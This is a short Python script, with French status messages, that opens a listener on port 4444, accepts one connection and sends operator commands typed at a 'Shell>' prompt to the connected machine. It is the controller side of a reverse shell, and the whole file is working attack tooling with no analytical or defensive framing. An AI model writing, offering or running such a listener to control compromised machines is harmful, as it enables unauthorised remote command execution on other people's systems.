import socket
import subprocess

def start_listener():
    host = "0.0.0.0"
    port = 4444

    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((host, port))
        s.listen(1)
        print(f"[+] Attente de connexion sur {host}:{port}...")
        conn, addr = s.accept()
        print(f"[+] Connexion reçue de {addr[0]}:{addr[1]}")

        while True:
            cmd = input("Shell> ")
            if cmd.lower() in ["exit", "quit"]:
                conn.send(b"exit")
                break
            conn.send(cmd.encode())
            data = conn.recv(4096).decode()
            print(data)

if __name__ == "__main__":
    start_listener()
